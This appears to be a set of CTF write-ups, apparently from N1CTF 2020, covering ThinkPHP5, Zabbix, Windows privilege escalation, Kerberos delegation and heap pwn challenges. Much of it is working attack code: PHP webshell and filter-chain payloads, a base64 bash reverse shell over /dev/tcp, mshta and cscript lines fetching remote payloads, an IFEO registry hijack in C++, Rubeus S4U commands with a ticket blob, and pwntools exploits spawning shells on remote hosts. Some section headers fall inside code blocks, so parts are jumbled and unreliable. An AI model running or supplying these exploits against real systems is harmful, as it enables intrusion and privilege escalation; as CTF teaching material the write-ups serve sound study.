Static ﬁles and pictures are generally placed in subdirectories of the public directory, and the 
corresponding folder has write permission. 
Suppose we want to write it to the public directory. Construct ../public/test;phpinfo();// , but 
syntax error. 
You might think of using a;"/../../public/test".phpinfo(); .
However, in Linux, the MKDIR path does not allow non-existent directory by default.
However, it is allowed under windows.
The test shows that if mkdir  takes a true parameter, it is allowed to have non-existent 
parameters in the path.
And the path of file_put_contents  also allows nonexistent directories.
In addition, mkdir  reports warning, which does not aﬀect the subsequent execution of the 
program.
He passed in the true parameter when he called mkdir .
In ThinkPHP5, exceptions are thrown by default for any errors, including warning errors.
We can use error_reporting  to bypass it
https://www.php.net/manual/en/function.error-reporting.php
Unexpected 1
_method=__construct&method=GET&server[]=1&filter[]=think\Build::module&get[]=index/
/../../public//?>
Unexpected 2
from vidar-team
b=../public/./&_method=__construct&filter=think\Build::moudle&a=1&method=GET
b=php://filter/read=string.rot13/resource=.//controller/Index.php&_method=__construct&filter=think\__include_file&a=1&method=G
ET
Unexpected 3
from 0ops
_method=__construct&filter[]=json_decode&filter[]=get_object_vars&filter[]=think\Lo
g::init&method=GET&get[]={"type":"File", "path":"/var/www/html/public/logs"}
But error_log  in disable_functions
Unexpected 4
Check other people's homework
_method=__construct&filter[]=scandir&filter[]=var_dump&method=GET&get[]=/var/www/ht
ml/public/
_method=__construct&filter[]=highlight_file&method=GET&get[]=/var/www/html/public/i
ndex.php
It's half expected 5
from 0xParrot@super guesser
curl --data 
"path=PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3N1cHBwLnBocCcsJ3N1cGVyIGd1ZXNzc3NlcnMnKTsgP
z4=&_method=__construct&filter[]=set_error_handler&filter[]=self::path&filter[]=bas
e64_decode&filter[]=\think\view\driver\Php::Display&method=GET" 
"http://101.32.184.39/?s=captcha&g=implode" --output - > a.html
This is his writeup: https://github.com/Super-Guesser/ctf/tree/master/N1CTF%202020/web/easy_
tp5
Zabbix_fun
0、Login with default credential Admin/zabbix
1、add server
http://127.0.0.1:8080/hosts.php?form=create
ﬁll zabbix-server  in dns
2、create script
http://127.0.0.1:8080/zabbix.php?action=script.edit
ﬁll in with following content:
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExNS4xMzYvODA4NSAwPiYx | base64 -d | 
bash -i
3、agent_get get ﬁle content
zabbix_get -s zabbix-agent -p 10050 -k vfs.file.contents[/flag/flag.txt]
Docker_manager
curl -K & /proc/id/cmdline
The King Of Phish
Victim Bot
Here only spaces are ﬁltered, not other blank strings, so you can just use other blank strings to 
bypass. Here's the open-ended solution, see the following Payload:
UserA-PC
use SeRestore privileges to modify the registry and hijack the processes started by high privilege 
processes. This is written more clearly in hatRiot's token-priv project.
SeRestorePrivilege.cpp
However, the code given by the token-priv project does not compile.
We can refer to the version modiﬁed by 3gstudent:
SeRestorePrivilege.cpp(3gstudent)
Modify se_restore_priv function to control IFEO and hijack wsqmcons.exe:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
$executioncontext.InvokeCommand.InvokeScript([System.Text.Encoding]::Unicode.Get
String([System.Convert]::FromBase64String('cABpAG4AZwAgAGIAYQBpAGQAdQAuAGMAbwBtA
A==')))
C:\Windows\System32\cmd.exe /c  type    %USERPROFILE%\Desktop\flag.txt
C:\Windows\System32\cmd.exe /k"whoami"
C:\Windows\System32\mshta.exe http://xxx.xxx.xxx.xxx:8080/1.hta
C:\Windows\System32\cscript.exe \\xxx.xxx.xxx.xxx\public\test.vbs
void se_restore_priv()
{
    DWORD sID;
    ProcessIdToSessionId(GetCurrentProcessId(), &sID);
    std::string data = "\"C:\\Windows\\System32\\cmd.exe\"";
    HKEY handle;
    LSTATUS stat = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution 
Options\\wsqmcons.exe",
        0,
        NULL,
        REG_OPTION_BACKUP_RESTORE,
        KEY_SET_VALUE,
        NULL,
        &handle,
        NULL);
    if (stat != ERROR_SUCCESS) {
        printf("[-] Failed opening key! %d\n", stat);
        return;
    }
    stat = RegSetValueExA(handle, "Debugger", 0, REG_SZ, (const 
BYTE*)data.c_str(), data.length() + 1);
    if (stat != ERROR_SUCCESS) {
        printf("[-] Failed writing key! %d\n", stat);
        return;
    }
    printf("[+] Key set");
    RegCloseKey(handle);
    return;
After hijacking wsqmcons.exe via IFEO, you can run the process with high privileges using the 
scheduled tasks.
Task path is \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
Run task as system:
Task will start wsqmcons.exe
This task will be performed every six hours, but it can also be performed proactively by regular 
users.
Task's dacl:
}
The task can be executed by an authenticated user, so we only need to start the task manually to 
trigger its execution.
schtasks /Run /TN "\Microsoft\Windows\Customer Experience Improvement 
Program\Consolidator"
Or you can just replace the system ﬁle with cmd.exe and get a cmd.exe in system privilege via 
StickKeys in RDP. Thank M N  for the unintended solution.
DC
Here's a trick involved that most people don't know about. 
It's SPN mappings.
First, use powerview to gather a bit of information and ﬁnd that there are constrained delegation.
Get host/dc  ticket:
Host ticket can't get target permissions directly, but with spn mapping we can convert it to 
another service ticket. 
ref: https://adsecurity.org/?page_id=183
Rubeus.exe tgtdeleg
Rubeus.exe s4u 
/ticket:doIE2jCCBNagAwIBBaEDAgEWooID6zCCA+dhggPjMIID36ADAgEFoQsbCU4xQ1RGLkxBQqIe
MBygAwIBAqEVMBMbBmtyYnRndBsJTjFDVEYuTEFCo4IDqTCCA6WgAwIBEqEDAgECooIDlwSCA5NRm8AG
h82ePsEB2qU0eC4rKkzc21dy6i+At9t58fIA3MJsJ/yLdqFzftcozSiUaWIftLOm08nrvLEXO84tbM6Y
yi56UEdr7rtqzlCK5kx4R4Q4WzlUp0yh+SN/V/A33K+UqkIF+GrNqaI4fYa1NTtSGYBEYr7OvVga4geh
iAGAsxHLA3TCOlD3yKFPO6FXcq8n4nYf7EiGZSJqhC1P2qTphdY2sLuzJR8rFtyPPcEeBs8keqUokXn7
AcJoAsUdx4AcHfHTGECApwzCcN+2hikR3ypUPeOdKVMabVB5EyUHhsdWg5mElqhnA36S/TWhfIdKiW3R
sjrd0xj2ZlEKZaZHNfWZ7gQg0ljft7ZqLTHk7Uz3ly8QsjABTyT0t8G5u3DZi2RJSChJggB0qiklPzWa
u9+iR5ILZQsSTIk0vFujaxrec6l424lHBZN1HQ4bYolRPguHOnR4F18wtWxBtdbVUUquBqTvhznuvEDm
UofWE8gElh8yNDYa2Ygeco06Arx2ZWyh5OR6ucK3V7ErDR6homQi4tpLTXico2UqFlmrZx6AGKDfDlQj
F0tzw+kjXYbxinL4yXW50utrOz88CiAe94RiDelSpZSCd9Wmu73fdtRq/MxjP3lSYWi7KSN2BzMa0Egm
a0SetpTry8Ag11TaL2JKqiVMe0x1oPcsHgvj+S3rfK1bQlB0wExso3MVwWZIOdJob2FbQxk8RvpBYKo1
UXXEiVdASv+404A3GQq1IOnE79Z+vGuC5EV+YOS4nvDhTZqX6/wJ3BA2xbMYBq1b8ZrWnE2J9NVmisdN
RfDA6w/9Pd10OjmVB+bnDvXlorKEKWG75S8PKU7d7QePO1PawjQfcwLxEopM8haEM6XsWf2wLe5VbKjD
rw1C7CxiUSPpWFMJFQuuj+ZEKQ+8qPNYLA5fpEOYZaP22Ps3HUWNThr7mww/2oI+RrWXwj6UkawKcvH3
DVpO6nNz8ntvxYmMFZxDqYJw8hVQGyDKEIjiz++omlPUFpaNXQMPuftNw2x/NXgZeT2qa+Ua8me7eW6D
fsmwlxMX15WQtz4XImd/DGulVguMCW+B4UyE1/GKjHTdyb77pEVhlzYfhSXmsgycv+Dfsz5VGQwHmHCF
TpkItMCRL8wbhIfmbjrphiBfm8e0E4J2g6LfEgiall3+PKluBohIcAb35OMtEKV+CjMNAk9D2PVqKEFL
w9NznQ/9J1OYxBOjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaArMCmgAwIBEqEiBCA39f2q
PYP9+VOXp1NGalZRlq/ip31IT2t6DDJxpwNBX6ELGwlOMUNURi5MQUKiEjAQoAMCAQGhCTAHGwVVc2Vy
QaMHAwUAYKEAAKURGA8yMDIwMTAxNDA3MDc0NVqmERgPMjAyMDEwMTQxNzA3MzRapxEYDzIwMjAxMDIx
MDcwNzM0WqgLGwlOMUNURi5MQUKpHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCU4xQ1RGLkxBQg== 
/impersonateuser:administrator /domain:n1ctf.lab /msdsspn:host/dc.n1ctf.lab 
/dc:dc.n1ctf.lab /ptt
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("
"))
The following SPNs are automatically mapped to HOST (SPNMapping property value)
host=alerter,appmgmt,cisvc,clipsrv,browser,dhcp,dnscache,replicator,eventlog,eventsystem,
policyagent,
oakley,dmserver,dns,mcsvc,fax,msiserver,ias,messenger,netlogon,netman,netdde,netddeds
m,nmagent,
plugplay,protectedstorage,rasman,rpclocator,rpc,rpcss,remoteaccess,rsvp,samss,scardsvr,s
cesrv,
seclogon,scm,dcom,cifs,spooler,snmp,schedule,tapisrv,trksvr,trkwks,ups,time,wins,www,htt
p,w3svc,
iisadmin,msdtc
This means that tgs in SPNMapping can be converted to each other, as they are essentially 
mapped to the Host.
How to exploit?
Very simple, just change the sname(service name).
Before:
After:
The easiest way is to edit tgs in hexadecimal.
Then, loading tickets via ptt:
That's all!
By the way, after talking to Daiker(The only one who solves the questions), I found out that 
Impacket will converts tickets automatically, and that Rubures can also do this too(with speciﬁc 
parameter altservice ).
Rubeus.exe s4u   /msdsspn:SERVICE/SERVER [/altservice:SERVICE] 
[/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]
Pwn
SignIn
from pwn import *
from time import time
s = process("./signin")
libc = ELF("./libc.so")
def add(idx,num):
    s.sendlineafter(">>","1")
    s.sendlineafter("Index:",str(idx))
    s.sendlineafter("Number:",str(num))
def free(idx):
    s.sendlineafter(">>","2")
    s.sendlineafter("Index:",str(idx))
def show(idx):
    s.sendlineafter(">>","3")
    s.sendlineafter("Index:",str(idx))
for i in range(257):
EasyWrite
    print i,
    add(1,1)
for i in range(514):
    print i,
    free(1)
show(1)
tmp = int(s.recvline(keepends=False))-0x3ebca0
success(hex(tmp))
free_hook = libc.sym['__free_hook']+tmp
system = tmp+libc.sym['system']
for i in range(269):
    print i,
    free(1)
show(1)
# gdb.attach(s,'b *$rebase(0x11e0)\nc')
add(1,free_hook-0x8)
add(2,u64("/bin/sh\x00"))
add(2,system)
s.interactive()
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL
# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
from pwn import *
libc = ELF("./libc-2.31.so")
p = remote('124.156.183.246',20000)
p.recvuntil(":")
libc_base = int(p.recvline().strip(), 16) - libc.sym["setbuf"]
tcache_ptr = libc_base + 0x1f34f0 
fake = p32(0) + p32(1)
fake = fake.ljust(0x12*8,'\x00')
fake += p64(libc_base + libc.sym["__free_hook"] - 0x10)
p.recvuntil('message')
p.sendline(fake)
p.recvuntil('write')
p.send(p64(tcache_ptr))
p.recvuntil('message?')
p.sendline('/bin/sh\x00'+p64(0)+p64(libc_base + libc.sym['system']))
p.interactive()
Babyrouter
Unexcepted
Because of qemu-usermode,ASLR is oﬀ. So many vulnerabilities could be used.For example,some 
teams used CVE-2018-18708.
Because ASLR is oﬀ,libc-base doesn't change, so you could use it to bypass 00.
exp:
Excepted
Under the excepted environment,ASLR is on,so many vulnerabilities couldn't be used.You should 
ﬁnd some way to bypass 00.
Because the vulnerability my exp used is a 0day,I will not release details.
In my exp,the vulnerability can cause overﬂow multiple times,and I use it to bypass 00.Then, just 
need to control parameters.
Escape
This is a Chromium exploitation challenge. Before we get into the challenge, I want to apologize 
for my akushumi of disabling WASM :p. I wasted a large proportion of time when solving another 
Chromium challenge in one of the CTFs thanks to this, so I was hoping to see some other 
techniques. (Also to prepare for W^X WASM JIT patch in v8, because one day it will be landed 
right?).
The patch:
import requests
from pwn import *
url = "http://8.210.119.59:9990/goform/setMacFilterCfg"
cookie = {"Cookie":"password=12345"}
cmd='bash -c "bash -i >& /dev/tcp/host/port 0>&1"\x00'
libc_base = 0xf65d8f70-0x0003df70
system_offset = 0x5a270
gadget1_offset = 0x18298
gadget2_offset = 0x40cb8